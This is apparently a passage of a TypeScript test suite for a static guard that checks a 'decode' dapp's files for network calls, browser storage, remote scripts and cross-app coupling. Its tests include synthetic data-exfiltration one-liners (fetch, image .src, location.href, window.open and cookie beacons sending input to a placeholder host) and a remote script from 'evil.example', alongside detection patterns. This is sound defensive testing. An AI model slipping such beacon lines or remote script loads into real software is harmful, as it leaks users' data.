      // D-03: the allowlist is a flat, file-independent policy (ALLOWED_GLOBALS stays free of
      // fetch — no OTHER file may use it), so the exemption is applied HERE, per-file, rather
      // than by adding fetch to the shared list.
      if (isNetworkExempt && v === NETWORK_EXEMPTED_IDENTIFIER) continue;
      if (isLinkExempt && v === LINK_EXEMPTED_IDENTIFIER) continue;
      violations.push(`${name}: unlisted global "${v}" — not on the permitted-globals allowlist`);
    }
  }
  for (const v of checkOtherDappCoupling(strings)) {
    violations.push(`${name}: ${v}`);
  }

  return violations;
}

// template.html is scanned by a separate raw literal check rather than the stripping helper —
// markup has no comment-and-string distinction worth making, and a remote script source (or an
// inline handler naming a forbidden API) is exactly what a raw scan catches.
function scanTemplateFile(name: string, content: string): string[] {
  const violations: string[] = [];

  for (const v of checkOrgPrefix(content)) {
    violations.push(`${name}: org-prefixed identifier "${v}"`);
  }
  for (const v of checkForbidden(content, NETWORK_IDENTIFIERS)) {
    violations.push(`${name}: references a network-request API ("${v}")`);
  }
  for (const v of checkForbidden(content, STORAGE_IDENTIFIERS)) {
    violations.push(`${name}: references a browser persistent-storage API ("${v}")`);
  }
  for (const id of OTHER_DAPP_IDS) {
    if (new RegExp(`\\b${id}\\b`).test(content)) {
      violations.push(`${name}: names another dapp's id "${id}"`);
    }
  }
  for (const route of OTHER_DAPP_ROUTES) {
    if (content.includes(route)) {
      violations.push(`${name}: names another dapp's route "${route}"`);
    }
  }
  if (DECODE_OWN_ROUTE && content.includes(DECODE_OWN_ROUTE)) {
    violations.push(`${name}: hardcodes this dapp's own route "${DECODE_OWN_ROUTE}" as a literal`);
  }
  if (/<script[^>]*\ssrc\s*=\s*["'](?:https?:)?\/\//i.test(content)) {
    violations.push(`${name}: remote script source`);
  }

  return violations;
}

function scanFiles(files: { name: string; content: string }[]): { file: string; message: string }[] {
  const results: { file: string; message: string }[] = [];
  for (const f of files) {
    const messages = f.name.endsWith('.html') ? scanTemplateFile(f.name, f.content) : scanSourceFile(f.name, f.content);
    for (const message of messages) results.push({ file: f.name, message });
  }
  return results;
}

// ── Manifest field assertions ──────────────────────────────────────────────────────────────

function manifestDeclaresStandaloneFalse(manifest: unknown): boolean {
  return (manifest as { standalone?: unknown })?.standalone === false;
}

function manifestRequiresSettings(manifest: unknown): boolean {
  const plugins = (manifest as { requires?: { plugins?: unknown } })?.requires?.plugins;
  return Array.isArray(plugins) && plugins.includes('settings');
}

// ═══════════════════════════════════════════════════════════════════════════════════════════

describe('the guard cannot go green by finding nothing to check', () => {
  it('the source-file collector finds at least one file under the decode dapp directory', () => {
    const files = collectDecodeSourceFiles(DECODE_DIR);
    expect(files.length).toBeGreaterThan(0);
  });

  it('a moved or renamed directory collects zero files rather than silently passing every case', () => {
    const files = collectDecodeSourceFiles(resolve(SRC, 'dapps/does-not-exist'));
    expect(files.length).toBe(0);
  });

  // D-04: proves the recursion actually happens, against a real nested file on disk — not just
  // that the flat case still works (the existing tests above already cover that).
  it('recurses into a subdirectory, closing the D-04 hole a flat readdirSync would miss', () => {
    const tmp = mkdtempSync(resolve(tmpdir(), 'decode-portability-d04-'));
    try {
      mkdirSync(resolve(tmp, 'nested'));
      writeFileSync(resolve(tmp, 'nested', 'inner.ts'), 'export const x = 1;');
      writeFileSync(resolve(tmp, 'top.ts'), 'export const y = 2;');
      const files = collectDecodeSourceFiles(tmp);
      expect(files).toContain(resolve(tmp, 'nested', 'inner.ts'));
      expect(files).toContain(resolve(tmp, 'top.ts'));
    } finally {
      rmSync(tmp, { recursive: true, force: true });
    }
  });
});

describe('D-03: the transport.ts fetch exemption', () => {
  it('has exactly one entry, and it is transport.ts', () => {
    expect(NETWORK_EXEMPT_FILES).toHaveLength(1);
    expect(NETWORK_EXEMPT_FILES).toContain('transport.ts');
  });

  it('a synthetic non-exempt file naming fetch is still reported, worded to name the exemption', () => {
    const violations = scanSourceFile('other.ts', 'fetch("https://example.com");');
    expect(violations.some((v) => v.includes('"fetch"'))).toBe(true);
    expect(violations.some((v) => v.includes('transport.ts'))).toBe(true);
    // WR-01/pre-05 wording preserved verbatim — existing test at line ~890 pins the same
    // substring against a non-exempt file and must keep passing unmodified.
    expect(violations.some((v) => v.includes('no code in this directory can make a request'))).toBe(true);
  });

  it('a synthetic exempt file with the fetch call OUTSIDE netRequest is reported', () => {
    const content = `
      function helper() { return fetch('https://x'); }
      function netRequest() { return null; }
    `;
    const violations = scanSourceFile('transport.ts', content);
    expect(violations.some((v) => v.includes('outside netRequest'))).toBe(true);
  });

  it('the same call INSIDE netRequest is not reported', () => {
    const content = `
      function netRequest() { return fetch('https://x'); }
    `;
    const violations = scanSourceFile('transport.ts', content);
    expect(violations).toEqual([]);
  });

  it('a bare mention of fetch in a string literal outside netRequest is NOT reported — invocations only, not occurrences', () => {
    const content = `
      // conceptually this file "calls fetch()" — the word alone, in a comment, is not an invocation
      const note = 'this file uses fetch() internally';
      function netRequest() { return fetch('https://x'); }
    `;
    const violations = scanSourceFile('transport.ts', content);
    expect(violations).toEqual([]);
  });

  it('every other network identifier, and every storage identifier, still applies to transport.ts', () => {
    const hrefViolations = scanSourceFile('transport.ts', "function netRequest() { location.href = 'x'; }");
    expect(hrefViolations.some((v) => v.includes('"href"'))).toBe(true);

    const storageViolations = scanSourceFile(
      'transport.ts',
      "function netRequest() { localStorage.setItem('a','b'); }",
    );
    expect(storageViolations.some((v) => v.includes('persistent-storage'))).toBe(true);
  });
});

describe('D-03 part 3: the link helper href exemption (05-06)', () => {
  it('has exactly one entry, and it is ui.ts', () => {
    expect(LINK_EXEMPT_FILES).toHaveLength(1);
    expect(LINK_EXEMPT_FILES).toContain('ui.ts');
  });

  it('a synthetic non-exempt file constructing a link is still reported', () => {
    const content = "function helper() { const a = document.createElement('a'); a.href = 'x'; return a; }";
    const violations = scanSourceFile('other.ts', content);
    expect(violations.some((v) => v.includes('"href"'))).toBe(true);
  });

  it('a synthetic exempt file with href OUTSIDE uiCreateExternalLink is reported', () => {
    const content = `
      function helper() { const a = document.createElement('a'); a.href = 'x'; return a; }
      function uiCreateExternalLink(target, text, kind) { return null; }
    `;
    const violations = scanSourceFile('ui.ts', content);
    expect(violations.some((v) => v.includes('outside uiCreateExternalLink'))).toBe(true);
  });

  it('the same construction INSIDE uiCreateExternalLink is not reported', () => {
    const content = `
      function uiCreateExternalLink(target, text, kind) {
        const anchor = document.createElement('a');
        anchor.href = target;
        return anchor;
      }
    `;
    const violations = scanSourceFile('ui.ts', content);
    expect(violations).toEqual([]);
  });

  it('every other network identifier still applies to ui.ts outside the helper', () => {
    const violations = scanSourceFile('ui.ts', "function openIt() { window.open('x'); }");
    expect(violations.some((v) => v.includes('"open"'))).toBe(true);
  });

  it('a file with no uiCreateExternalLink declared at all reports every href reference as out of bounds', () => {
    const violations = scanSourceFile('ui.ts', "const a = document.createElement('a'); a.href = 'x';");
    expect(violations.some((v) => v.includes('outside uiCreateExternalLink'))).toBe(true);
  });
});

describe('comment-and-string stripping', () => {
  it('removes line comments, block comments, and quoted string literals', () => {
    const { code, strings } = stripCommentsAndStrings(
      "// a comment\nconst x = 'hello'; /* block */ const y = `world`;",
    );
    expect(code).not.toContain('comment');
    expect(code).not.toContain('hello');
    expect(code).not.toContain('block');
    expect(code).not.toContain('world');
    expect(strings).toEqual(['hello', 'world']);
  });
});

describe('the permitted-globals allowlist', () => {
  it('matches whole identifiers, not prefixes', () => {
    expect(isAllowedGlobal('window')).toBe(true);
    expect(isAllowedGlobal('windowFoo')).toBe(false);
  });

  it('does not include getSelection', () => {
    expect(ALLOWED_GLOBALS).not.toContain('getSelection');
  });

  it('allowlists Response but not fetch — constructing a Response makes no request', () => {
    expect(ALLOWED_GLOBALS).toContain('Response');
    expect(ALLOWED_GLOBALS).not.toContain('fetch');
  });

  it('covers the whole phase contract, including globals nothing on disk uses yet', () => {
    for (const name of ['navigator', 'history', 'URLSearchParams', 'URL', 'CompressionStream', 'DecompressionStream']) {
      expect(ALLOWED_GLOBALS).toContain(name);
    }
  });

  it('new URL(...) alone (no location.href) produces no violation — constructing a URL makes no request', () => {
    expect(scanSourceFile('u.ts', "const link = new URL('https://example.com');")).toEqual([]);
  });

  // WR-01 added 'href' to NETWORK_IDENTIFIERS to catch a WRITE (`location.href = …`, one of the
  // review's eight escape shapes) — a plain word scan cannot distinguish that from a READ
  // (`new URL(location.href)`), so a read is reported too until a later plan justifies a
  // dedicated read-only exemption. Nothing in this directory reads location.href today; the
  // guard failing CLOSED here (over-reporting a hypothetical) is the documented trade-off, not
  // a bug — see the NETWORK_IDENTIFIERS comment.
  it('reading location.href is reported too — no read/write distinction exists yet, and nothing here needs one', () => {
    const violations = scanSourceFile('u2.ts', 'const link = new URL(location.href);');
    expect(violations.some((v) => v.includes('"href"'))).toBe(true);
  });
});

describe('the expression-position rule — type positions are excluded, runtime uses are not', () => {
  it('a DOM interface name used only as a type annotation passes', () => {
    expect(scanSourceFile('t1.ts', 'function f(el: HTMLTextAreaElement[]) { return el; }')).toEqual([]);
  });

  it('the same DOM interface name used at run time is reported', () => {
    const violations = scanSourceFile('t2.ts', 'HTMLTextAreaElement.prototype.focus.call(document.body);');
    expect(violations.some((v) => v.includes('HTMLTextAreaElement'))).toBe(true);
  });

  it('an "as" cast target is a type position, not a runtime reference', () => {
    expect(scanSourceFile('c.ts', 'const arr = raw as HTMLTextAreaElement[];')).toEqual([]);
  });

  it('a network identifier inside a line comment passes; the same identifier in expression position is reported', () => {
    expect(scanSourceFile('n1.ts', '// uses fetch conceptually\nconst x = 1;')).toEqual([]);
    const violations = scanSourceFile('n2.ts', 'function go() { return fetch("/x"); }');
    expect(violations.some((v) => v.includes('fetch'))).toBe(true);
  });

  it('the same words, moved into a STRING literal, are now reported — WR-01 closed this gap', () => {
    const content =
      "const message = 'nothing left this browser: no fetch, no localStorage, " +
      "decoders that reach out are logged here.';";
    const violations = scanSourceFile('privacy-string.ts', content);
    expect(violations.some((v) => v.includes('fetch'))).toBe(true);
    expect(violations.some((v) => v.includes('localStorage'))).toBe(true);
  });

  it('the REAL ui.ts privacy sentence still passes — it states the guarantee without naming a forbidden API', () => {
    const content = readFileSync(resolve(DECODE_DIR, 'ui.ts'), 'utf-8');
    const violations = scanSourceFile('ui.ts', content);
    expect(violations).toEqual([]);
  });
});

// ── WR-01: realistic exfiltration/persistence shapes the guard previously missed ──────────
//
// Each of these is a synthetic file carrying one of the eight shapes the review's own
// scanSourceFile run returned `[]` for. Item 8 (the dapp's own route as a literal) is WR-03's
// fix, not this one — OTHER_DAPP_ROUTES excludes decode's own manifest by design. Item 7
// (`replaceState` chained to every `input` event) is intentionally NOT caught here either:
// `history`/`replaceState` are legitimate for the Copy-link feature itself, so a static
// identifier scan cannot distinguish a legitimate press-time write from an on-input one — that
// is exactly why WR-01's fix adds a RUNTIME test (test/decode-url.test.ts) instead.
describe('WR-01 — string-built and property-assignment exfiltration/persistence shapes', () => {
  it('bracket-notation fetch built from a string literal', () => {
    const violations = scanSourceFile('a.ts', "window['fetch']('https://x/?d=' + input);");
    expect(violations.some((v) => v.includes('fetch'))).toBe(true);
  });

  it('an element .src assignment', () => {
    const violations = scanSourceFile('b.ts', "document.createElement('img').src = 'https://x/?d=' + input;");
    expect(violations.some((v) => v.includes('"src"'))).toBe(true);
  });

  it('location.href assignment', () => {
    const violations = scanSourceFile('c.ts', "location.href = 'https://x/?d=' + input;");
    expect(violations.some((v) => v.includes('"href"'))).toBe(true);
  });

  it('window.open', () => {
    const violations = scanSourceFile('d.ts', "window.open('https://x/?d=' + input);");
    expect(violations.some((v) => v.includes('"open"'))).toBe(true);
  });

  it('document.cookie assignment', () => {
    const violations = scanSourceFile('e.ts', "document.cookie = 'd=' + input;");
    expect(violations.some((v) => v.includes('persistent-storage') && v.includes('cookie'))).toBe(true);
  });

  it('bracket-notation localStorage built from a string literal', () => {
    const violations = scanSourceFile('f.ts', "window['localStorage'].setItem('d', input);");
    expect(violations.some((v) => v.includes('localStorage'))).toBe(true);
  });
});

describe('the forbidden scans, proven to fail against a violation', () => {
  it('reports a synthetic file carrying an org-prefixed identifier', () => {
    const violations = scanSourceFile('x.ts', 'window.DnznFoo = 1;');
    expect(violations.some((v) => v.includes('org-prefixed'))).toBe(true);
  });

  it("reports a synthetic file naming another dapp's route", () => {
    const violations = scanSourceFile('x.ts', "const r = '/tools/cic';");
    expect(violations.some((v) => v.includes('route'))).toBe(true);
  });

  it('reports a synthetic file referencing a network API, worded as "no code in this directory can make a request"', () => {
    const violations = scanSourceFile('x.ts', 'fetch("https://example.com");');
    expect(violations.some((v) => v.includes('no code in this directory can make a request'))).toBe(true);
  });

  it('reports a synthetic file referencing a browser persistent-storage API', () => {
    const violations = scanSourceFile('x.ts', 'localStorage.setItem("a", "b");');
    expect(violations.some((v) => v.includes('persistent-storage'))).toBe(true);
  });

  it('reports both files when two violate, and reversing the input order reports the same two', () => {
    const fileA = { name: 'a.ts', content: 'const DnznFoo = 1;' };
    const fileB = { name: 'b.ts', content: 'fetch("https://x");' };

    const forward = scanFiles([fileA, fileB]).map((v) => v.file);
    const reversed = scanFiles([fileB, fileA]).map((v) => v.file);

    expect(new Set(forward)).toEqual(new Set(['a.ts', 'b.ts']));
    expect(new Set(reversed)).toEqual(new Set(forward));
  });
});

describe('template.html — a separate raw literal check', () => {
  it('reports a synthetic template carrying a remote script source', () => {
    const violations = scanTemplateFile(
      'template.html',
      '<div></div><script src="https://evil.example/x.js"></script>',
    );
    expect(violations.some((v) => v.includes('remote script'))).toBe(true);
  });

  it('the real template.html has no violations', () => {
    const content = readFileSync(resolve(DECODE_DIR, 'template.html'), 'utf-8');
    expect(scanTemplateFile('template.html', content)).toEqual([]);
  });
});

describe('the other-dapp id and route derivation', () => {
  it("excludes decode's own manifest", () => {
    expect(DECODE_MANIFEST).toBeDefined();
    expect(OTHER_DAPP_IDS).not.toContain(DECODE_MANIFEST?.id);
    expect(OTHER_DAPP_ROUTES).not.toContain(DECODE_MANIFEST?.route);
  });

  it('is derived from the manifests on disk, not restated as a literal array', () => {
    expect(OTHER_DAPP_IDS).toEqual(expect.arrayContaining(['about', 'projects', 'support', 'tpl', 'cic']));
  });

  it('excludes the single-character "about" route — matching it textually would fail every file', () => {
    expect(OTHER_DAPP_ROUTES).not.toContain('/');
  });

  it('exempts the settings id (D-12/manifest requires.plugins) but keeps the settings route forbidden', () => {
    expect(OTHER_DAPP_IDS).not.toContain('settings');
    expect(OTHER_DAPP_ROUTES).toContain('/settings');

    expect(scanSourceFile('s1.ts', "const x = 'settings';")).toEqual([]);
    const violations = scanSourceFile('s2.ts', "const x = '/settings';");
    expect(violations.some((v) => v.includes('route'))).toBe(true);
  });

  it('matches an id as a whole identifier inside a string literal only', () => {
    expect(scanSourceFile('w1.ts', "const x = 'this uses a template file';")).toEqual([]);
    const violations = scanSourceFile('w2.ts', "const x = 'tpl';");
    expect(violations.some((v) => v.includes('"tpl"'))).toBe(true);
  });

  // WR-03: the guard was blind to decode's OWN route by construction (Rule 1 above excludes it
  // from OTHER_DAPP_ROUTES) — this is the guard that closes that gap, proven against a synthetic
  // file rather than the real directory (which must stay clean after WR-03's fix).
  it("reports decode's own route hardcoded as a literal, in both a .ts file and template.html", () => {
    const tsViolations = scanSourceFile('x.ts', `const u = '#${DECODE_MANIFEST?.route}/?x=1';`);
    expect(tsViolations.some((v) => v.includes('own route'))).toBe(true);

    const htmlViolations = scanTemplateFile('template.html', `<a href="#${DECODE_MANIFEST?.route}/">x</a>`);
    expect(htmlViolations.some((v) => v.includes('own route'))).toBe(true);
  });
});

describe('manifest field assertions', () => {
  it("decode's manifest declares standalone: false", () => {
    expect(manifestDeclaresStandaloneFalse(DECODE_MANIFEST)).toBe(true);
  });

  it("decode's manifest requires the settings plugin", () => {
    expect(manifestRequiresSettings(DECODE_MANIFEST)).toBe(true);
  });

  it('the standalone assertion fails when the field is absent or wrong, against a synthetic manifest', () => {
    expect(manifestDeclaresStandaloneFalse({})).toBe(false);
    expect(manifestDeclaresStandaloneFalse({ standalone: true })).toBe(false);
  });

  it('the requires.plugins assertion fails when the field is absent or wrong, against a synthetic manifest', () => {
    expect(manifestRequiresSettings({})).toBe(false);
    expect(manifestRequiresSettings({ requires: {} })).toBe(false);
    expect(manifestRequiresSettings({ requires: { plugins: ['other'] } })).toBe(false);
  });
});

describe('the real decode directory, scanned file by file', () => {
  const files = collectDecodeSourceFiles(DECODE_DIR);
  const scannedNames = files.map((f) => f.slice(DECODE_DIR.length + 1));

  it(`scanned ${scannedNames.length} files: ${scannedNames.join(', ')}`, () => {
    expect(scannedNames.length).toBeGreaterThan(0);
  });

  for (const file of files) {
    const name = file.slice(DECODE_DIR.length + 1);
    it(`${name} has no portability or privacy violations`, () => {
      const content = readFileSync(file, 'utf-8');
      const violations = name.endsWith('.html') ? scanTemplateFile(name, content) : scanSourceFile(name, content);
      expect(violations).toEqual([]);
    });
  }
});
